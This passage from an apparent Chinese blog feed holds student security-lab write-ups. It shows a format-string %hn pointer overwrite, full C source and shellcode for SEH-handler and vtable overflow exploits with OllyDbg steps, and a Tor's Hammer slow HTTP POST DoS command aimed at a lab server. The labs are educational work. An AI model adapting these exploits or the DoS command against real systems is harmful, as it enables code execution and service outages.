practice.</span></span><br><span class="line">    <span class="comment">//Exits buried deep in the X Window libraries once cost</span></span><br><span class="line">    <span class="comment">//me over a week of debugging effort.</span></span><br><span class="line">    <span class="comment">//All application exits should occur in main, ideally in one place.</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">foo</span><span class="params">()</span></span>{ </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"I've been hacked!!!"</span>); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RecoverableError</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> err)</span></span>{ </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Something went wrong, but you can fix it - err = %d\n"</span>, err); </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintMessage</span><span class="params">(<span class="type">char</span>* file, <span class="type">unsigned</span> <span class="type">long</span> err)</span></span>{ </span><br><span class="line">    ErrFunc fErrFunc; <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(err == <span class="number">5</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="comment">//access denied</span></span><br><span class="line">		fErrFunc = GhastlyError;</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	{</span><br><span class="line">		fErrFunc = RecoverableError;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	_snprintf(buf, <span class="built_in">sizeof</span>(buf)<span class="number">-1</span>, <span class="string">"Can'tFind%s"</span>, file);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//just to show you what is in the buffer</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s"</span>, buf);</span><br><span class="line">	<span class="comment">//just in case your compiler changes things on you</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nAddress of fErrFunc is %p\n"</span>, &amp;fErrFunc);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Here's where the damage is done!</span></span><br><span class="line">	<span class="comment">//Don't do this in your code.</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="built_in">fprintf</span>(stdout, buf);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\nCalling ErrFunc %p\n"</span>, fErrFunc);</span><br><span class="line">	<span class="built_in">fErrFunc</span>(err);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>{ </span><br><span class="line">	<span class="comment">//__asm int 3 </span></span><br><span class="line">	<span class="type">int</span> iTmp = <span class="number">100</span>; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%.300x%hn"</span>,<span class="number">11</span>, &amp;iTmp); </span><br><span class="line">	FILE* pFile;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//a little cheating to make the example easy</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Address of foo is %p\n"</span>, foo);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//this will only open existing files</span></span><br><span class="line">	pFile = <span class="built_in">fopen</span>(argv[<span class="number">1</span>], <span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pFile == <span class="literal">NULL</span>)</span><br><span class="line">	{</span><br><span class="line">		<span class="comment">//PrintMessage(argv[1], errno);</span></span><br><span class="line">		<span class="built_in">PrintMessage</span>(argv[<span class="number">1</span>], errno);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Opened %s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">fclose</span>(pFile);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<div class="note default"><p><code>main</code> 函数中根据命令行提供的参数打开对应的文件。如果这个文件不存在，那么就调用 <code>PrintMessage</code> 函数打印相应的错误信息。在 <code>PrintMessage</code> 函数中把错误分为 <code>GhastlyError</code> 和 <code>RecoverableError</code> 两类。要想调用 <code>foo</code> 函数，可以通过 <code>%n</code> 把 <code>fErrFunc</code> 函数的地址修改为 <code>foo</code> 函数的地址。命令行参数为：<code>%x%x…%x%x%n</code>+fErrFunc 函数指针的地址。<code>snprintf</code> 之后 <code>buf</code> 为 <code>"Can'tFind%x%x…%x%x%n"</code>+fErrFunc 函数指针的地址，接下来由于 <code>fprintf(stdout, buf)</code> 中缺少了 <code>argument</code> 参数，所以已打出的字符总数通过 <code>%n</code> 被写入 fErrFunc 函数指针的地址。通过控制 <code>%x</code> 调整已打出的字符总数就能达到我们的目的。</p>
</div>
<ol>
<li>首先传入一串 <code>%x</code><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">argv=<span class="string">"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"</span></span><br></pre></td></tr></tbody></table></figure>
</li>
<li><code>fErrFunc</code> 在 <code>0x12ff18</code> 位置上，<code>foo</code> 在 <code>0x401014</code> 上，<code>2578</code> 是 <code>%x</code> 的 ASCII 码。 <img data-src="/2019/12/25/experiments/security/software/string-format/r1.png" class=""></li>
<li>加上 <code>%pABC</code><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line">argv=<span class="string">"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%pABC"</span></span><br></pre></td></tr></tbody></table></figure> 
<img data-src="/2019/12/25/experiments/security/software/string-format/r2.png" class="">
</li>
<li>我们需要把 <code>\x18\xff\x12</code> 放在一个可写的位置上，在前面加上<code>.</code> 以调整输出内容 <img data-src="/2019/12/25/experiments/security/software/string-format/r3.png" class=""></li>
<li>现在把 <code>%p</code> 换为 <code>%hn</code>，由于多了一个 <code>h</code>，所以前面要少一个<code>.</code>，在后面我们还要放上 <code>\x18\xff\x12</code>。 <img data-src="/2019/12/25/experiments/security/software/string-format/r4.png" class=""><div class="note info no-icon"><p>此时 <code>0x12ff18</code> 的位置已经被更改为 <code>0x40017e</code>。</p>
</div>
</li>
<li><code>foo</code> 的地址是 <code>0x00401014</code>，现在我们写入的值是 <code>0x0040017E</code>，还差 3734 个字节。 <img data-src="/2019/12/25/experiments/security/software/string-format/r5.png" class=""><div class="note info"><p>这里是 3744 不是 3734，因为原来第一个 <code>%x</code> 打印了 6 个字节，为了对齐删掉了 4 个<code>.</code> 又少打印了 4 个字节，所以要把总共少打印的这 10 个字节加回去。从上图可以看出第一个 <code>%x</code> 对应的内容是 <code>0012FF80</code>，只打印了 <code>12FF80</code>；第二个 <code>%x</code> 对应的内容是 <code>00000000</code>，只打印了 <code>0</code>；从第三个 <code>%x</code> 开始正常打印 8 个字节。<br>
<img data-src="/2019/12/25/experiments/security/software/string-format/r6.png" class="" title="这样构造，即可成功"></p>
</div>
</li>
<li>利用成功。 <img data-src="/2019/12/25/experiments/security/software/string-format/rsuccess.png" class="" title="成功弹框"></li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>软件安全</category>
        <category>漏洞</category>
        <category>格式化字符串</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>虚函数攻击与 SEH</title>
    <url>/2019/12/12/experiments/security/software/virtual_func_and_seh/</url>
    <content><![CDATA[<h2 id="目标">目标</h2>
<p>了解 SEH 和虚函数攻击两种攻击方式，通过调试代码来理解进行上述攻击的过程。</p>
<span id="more"></span>
<h2 id="测试步骤与结果">测试步骤与结果</h2>
<h3 id="SEH攻击">SEH 攻击</h3>
<figure class="highlight c++"><figcaption><span>main.cpp</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x48\xFE\x12\x00"</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MyExceptionHandler</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"got an exception,press Enter to kill process!\n"</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">ExitProcess</span>(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="comment">//printf("%d",strlen(shellcode));</span></span><br><span class="line">	<span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	__try</span><br><span class="line">	{</span><br><span class="line">		<span class="built_in">strcpy</span>(buf,input);</span><br><span class="line">		zero=<span class="number">4</span>/zero;</span><br><span class="line">	}</span><br><span class="line">	__except(<span class="built_in">MyExceptionHandler</span>()){}</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="built_in">test</span>(shellcode);</span><br><span class="line">	<span class="comment">//test("abc");</span></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在此实验中，我们定义了一个自定义的错误处理函数 <code>MyExceptionHandler()</code>，可以观察到，<code>__try</code> 中试图除零，因此引发了一个异常，这个异常将由我们自定义的错误处理函数处理。如果 <code>strcpy</code> 操作溢出了，并精确地将栈帧中的 SEH 异常处理句柄修改为 <code>shellcode</code> 的入口地址时，操作系统将会错误地使用 shellcode 去处理除 0 异常，代码植入成功。</p>
<div class="note info"><p>前面的<code>__asm int 3</code> 是为了使得调试器能够以 attach 的方式进行调试。</p>
</div>
<ol>
<li>在 ollydbg 端完成实时调试配置，将它设置为实时调试器。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/1.png" class=""></li>
<li>启动程序，在运行到 int 3 断点时成功进入 ollydbg 中。<div class="note warning"><p>初次进入时可能会有这个错误，设置一下 udd 和 plugins 的目录即可。<br>
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/2.png" class=""> <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/3.png" class=""></p>
</div>
</li>
<li>找到 <code>strcpy</code> 函数，并为其设置一个断点。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/4.png" class="" title="可以看到这是在401158处"> <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/5.png" class=""></li>
<li>此时可以观察到 shellcode 的起始地址为 <code>0x12fe48</code>。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/6.png" class=""></li>
<li>触发异常时，我们查看 SEH 链：（查看→SEH 链）<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/7.png" class=""></div><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/8.png" class=""></div></div></div>
</li>
<li>上方的第一个地址指向了下一个 SEH 记录：<code>0x12ffb0</code>。接着是 SEH 异常处理程序，我们只要把 <code>0x12ff1c</code> 的内容改成 shellcode 的起始地址就可以了。</li>
<li>第一个 SEH 地址是 <code>0x12ff18</code>，异常处理地址是 <code>0x12ff1c</code>，我们的 shellcode 应该填充这些差值空间，总共有 212 个字节（0x12ff1c-0x12ff18）<div class="note success no-icon"><p>回头看一眼我们要填入的 shellcode，最后四字节 (<code>\x48\xFE\x12\x00</code>) 恰好是 shellcode 的起始地址！</p>
</div>
</li>
<li>去掉系统中断（<code>asm int 3</code>）后的运行效果如下，弹出对话框正是 shellcode 预期的功能。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/9.png" class=""></li>
</ol>
<h3 id="虚函数攻击">虚函数攻击</h3>
<figure class="highlight c++"><figcaption><span>main.cpp</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode1[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"</span></span><br><span class="line"><span class="string">"\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x5C\xE3\x42\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line">vf overflow, *p;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;</span><br><span class="line">	<span class="comment">//point to virtual table //__asm int 3 //reset</span></span><br><span class="line">	fake <span class="keyword">virtual</span> table to <span class="number">0x004088cc</span> <span class="comment">//the address may need to adjusted via runtime debug p_vtable[0]=0x30; p_vtable[1]</span></span><br><span class="line">	=<span class="number">0xE4</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode1);</span><br><span class="line">	<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	p=&amp;overflow;</span><br><span class="line">	p-&gt;<span class="built_in">test</span>();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ol>
<li>
<p>在 <code>strcpy</code> 处可能会触发溢出，修改虚函数指针。<code>Vtable</code> 的值需要经过一次调试才可得知。</p>
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/10.png" class=""> 
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/11.png" class="">
<p>从这两张图可以看出，缓冲区的入口为 <code>0x0042e35c</code>。虚表指针位于缓冲区前，<code>p_vtable</code> 定位到了这个指针，它指向了 <code>0x0042e358</code> 处，进一步证明缓冲区入口正确。</p>
</li>
<li>
<p>Shellcode 的末尾后四个字节地址应该是 <code>0x0042E430</code>。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/12.png" class=""></p>
</li>
<li>
<p>更换 shellcode 和地址后，成功弹框，shellcode 成功执行。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/13.png" class=""></p>
</li>
</ol>
<h2 id="测试结论">测试结论</h2>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/SEH.jpg" class="" title="SEH异常处理攻击图示"></div><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/vf.jpg" class="" title="虚函数攻击图示"></div></div></div>
<h2 id="思考题">思考题</h2>
<figure class="highlight c++"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf1</span> {</span><br><span class="line">	<span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span> </span>{</span><br><span class="line">		cout&lt;&lt;<span class="string">"Class Vtable1::test()"</span>&lt;&lt;endl;</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line">;</span><br><span class="line">vf overflow, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>{</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">"user32.dll"</span>);</span><br><span class="line">	<span class="comment">//char * p_vtable;</span></span><br><span class="line">	<span class="comment">//p_vtable=overflow.buf-4;</span></span><br><span class="line">	<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3 </span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc </span></span><br><span class="line">	<span class="comment">//the address may need to adjusted via runtime debug</span></span><br><span class="line">	<span class="comment">//p_vtable[0]=0x30; </span></span><br><span class="line">	<span class="comment">//p_vtable[1]=0xE4; </span></span><br><span class="line">	<span class="comment">//p_vtable[2]=0x42; </span></span><br><span class="line">	<span class="comment">//p_vtable[3]=0x00;</span></span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>) {</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow.buf,argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow1.buf,argv[<span class="number">2</span>]);</span><br><span class="line">		<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">		p=&amp;overflow;</span><br><span class="line">		p-&gt;<span class="built_in">test</span>();</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"vf argv1 argv2\n"</span>);</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<ol>
<li>
<p>这应该是利用虚函数攻击的一个例子。其中定义了两个类：<code>vf</code> 和 v<code>f1</code>，<code>vf</code> 具有 200 字节的 <code>buf</code> 大小，而 <code>vf1</code> 具有 64 字节的 <code>buf</code> 大小。我们需要提供两个参数，一个复制到 <code>vf</code> 的 <code>buf</code> 区，另一个复制到 <code>vf1</code><br>
的 <code>buf</code> 区中，要通过 <code>vf</code> 类的 <code>test</code> 方法调用 shellcode。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%831.png" class=""></p>
</li>
<li>
<p><code>argv[1]</code> 被复制到 <code>overflow.buf</code> 中，起始地址为 <code>0x42eb5c</code>。算出其终止地址应为 <code>0x42ec20</code>。</p>
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%832.png" class=""> 
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%833.png" class="" title="前面四个字节0x0042801c应该是vtable的地址，一会我们要覆盖掉它">
</li>
<li>
<p>第二个 <code>strcpy</code> 时，将第二个参数拷贝到 <code>overflow1.buf</code> 中，其首地址为 <code>0x42eb14</code>，在 <code>overflow</code> 上方，我们想到应该可以利用这个关系，溢出这个 64 字节的 <code>buf</code>，覆盖掉 <code>vtable</code>，让其调用 shellcode</p>
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%834.png" class=""> <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%835.png" class="">
</li>
<li>
<p>构造 shellcode 如下，其中插入 <code>vf</code> 中的 shellcode1 写入弹框代码，插入 <code>vf1</code> 中的 shellcode2 向下覆盖掉 <code>vf1</code> 的 <code>vtable</code><br>
，变为 shellcode1 的尾地址，而令 shellcode1 中最后四字节为 shellcode 第一个指令的地址（即 <code>overflow.buf</code> 的起始位置）。在这个构造下，可以成功执行 shellcode，以弹出对话框。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/argv%5B1%5D.png" class="" title="argv[1]"></div><div class="group-picture-column"><img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/argv%5B2%5D.png" class="" title="argv[2]"></div></div></div>
<img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%838.png" class="">
</li>
<li>
<p>利用成功截图。 <img data-src="/2019/12/12/experiments/security/software/virtual_func_and_seh/%E6%80%9D%E8%80%839.png" class=""></p>
</li>
</ol>
]]></content>
      <categories>
        <category>实验</category>
        <category>软件安全</category>
        <category>漏洞</category>
        <category>SEH</category>
        <category>虚函数</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>慢速 DDoS 攻击实验</title>
    <url>/2019/11/02/experiments/security/system/slow-ddos/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>了解 tomcat-jsp 网站架构，学习慢速 HTTP POST 攻击原理和防护。</p>
<span id="more"></span>
<h2 id="实验内容">实验内容</h2>
<ol>
<li>使用 tomcat8.0 和 mysql5.7 搭建 java 语言开发的网站。</li>
<li>用 Tor’s hammer 1.0 工具对第一步搭建的网站发动慢速 HTTP POST 攻击。</li>
</ol>
<h2 id="实验环境">实验环境</h2>
<img data-src="/2019/11/02/experiments/security/system/slow-ddos/env.jpg" class="">
<h2 id="实验要求">实验要求</h2>
<p>完成（二）实验内容并回答课后问题。</p>
<h2 id="实验步骤和结果">实验步骤和结果</h2>
<h3 id="网站搭建">网站搭建</h3>
<ol>
<li>
<p>Tomcat 需要 java 环境运行，所以需要先安装 java 运行环境 jre，安装过后环境显示如下 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre0.png" class=""></p>
</li>
<li>
<p>安装 Tomcat 工具，Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试 JSP 程序的首选。</p>
 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre1.png" class="" title="留意到Tomcat使用的http默认端口为8080，而不是80。这意味着我们如果一会要测试安装效果的话，要输入本机IP:8080来查看">
</li>
<li>
<p>安装过后，在 Properties 中的 General 选项卡中，点击 Start 开始服务 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre2.png" class=""></p>
</li>
<li>
<p>访问 <code>localhost:8080</code>，测试安装情况 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre3.png" class=""></p>
</li>
<li>
<p>把目标网站的 <code>ROOT</code> 目录拷贝到 tomcat 安装目录下的 <code>webapps</code> 目录中并覆盖。</p>
 <div class="note primary"><p>tomcat 启动时会加载 webapps 目录下的应用程序，其中 ROOT 目录是网站的根目录，即 <code>/</code></p>
</div>
 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre4.png" class="">
</li>
<li>
<p>准备数据，将 <code>fenxiao.sql</code> 导入到 mysql 数据库中。</p>
 <div class="note info"><p>在 mysql5.7 命令行中应该使用以下代码进行导入操作</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="keyword">create</span> database fenxiao; </span><br><span class="line">use fenxiao; </span><br><span class="line">source fenxiao.sql; </span><br></pre></td></tr></tbody></table></figure></div>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre5.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre6.png" class=""></div></div></div>
</li>
<li>
<p>配置 <code>database.properties</code> 文件</p>
<ul>
<li>指定 <code>jdbc.user</code> 和 <code>jdbc.password</code> 为相应 mysql 数据库的配置，<code>jdbcUrl</code> 的本机地址部分要填写为 <code>localhost</code> 而非本机 IP（因为 <code>root@localhost</code> 代表了 <code>root</code> 只允许本机登录，若要从任何地方登录需要把 <code>localhost</code> 改为通配符 <code>%</code>）。  <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre7.png" class="">
</li>
<li>对于 <code>mysql 6+</code>，<code>driver</code> 需要填写为 <code>com.mysql.cj.jdbc.Driver</code>。</li>
</ul>
</li>
<li>
<p>测试访问网站 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/pre8.png" class="" title="网站访问成功"></p>
</li>
</ol>
<h3 id="Tor’s-Hammer-工具攻击">Tor’s Hammer 工具攻击</h3>
<ol>
<li>打开攻击机，启动其中的 torshammer 工具。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack0.png" class=""></li>
<li>使用命令 <code>python torshammer.py -t 192.168.235.138 -r 201 -p 8080</code> 发动攻击。 <img data-src="/2019/11/02/experiments/security/system/slow-ddos/attack1.png" class=""></li>
